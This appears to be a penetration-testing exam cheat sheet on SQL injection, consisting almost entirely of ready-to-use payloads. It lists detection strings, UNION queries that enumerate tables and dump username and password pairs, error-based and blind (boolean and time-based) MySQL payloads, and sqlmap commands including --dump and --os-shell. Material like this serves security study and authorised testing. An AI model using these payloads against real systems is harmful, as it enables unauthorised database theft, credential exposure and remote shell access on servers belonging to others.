# SQL Injection (SQLi)

## Detection
```sql
' -- -
' -- 
'
"
\
%27
%2527
```

## UNION-based
```sql
' UNION SELECT 1,2,3-- -
' UNION SELECT 1,@@version,3-- -
' UNION SELECT 1,database(),user()-- -
' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables-- -
' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users'-- -
' UNION SELECT 1,group_concat(username,':',password),3 FROM users-- -
```

## Error-based MySQL
```sql
' AND extractvalue(1, concat(0x7e, (SELECT database())))-- -
' AND updatexml(1, concat(0x7e, (SELECT database())), 1)-- -
```

## Blind SQLi
```sql
# Boolean-based
' AND 1=1-- -  (True)
' AND 1=2-- -  (False)
' AND SUBSTRING((SELECT database()),1,1)='t'-- -

# Time-based (MySQL)
' AND SLEEP(5)-- -
' AND IF(SUBSTRING((SELECT database()),1,1)='t', SLEEP(3), 0)-- -
```

## SQLMap
```bash
sqlmap -u "http://$TARGET_IP/page?id=1" --batch
sqlmap -u "http://$TARGET_IP/page?id=1" --cookie="PHPSESSID=123" --batch
sqlmap -r request.txt --batch
sqlmap -u "http://$TARGET_IP/page?id=1" --os-shell --batch
sqlmap -u "http://$TARGET_IP/page?id=1" --dump --batch
```

> **Note**: sqlmap is restricted on the exam. Know manual SQLi techniques first.
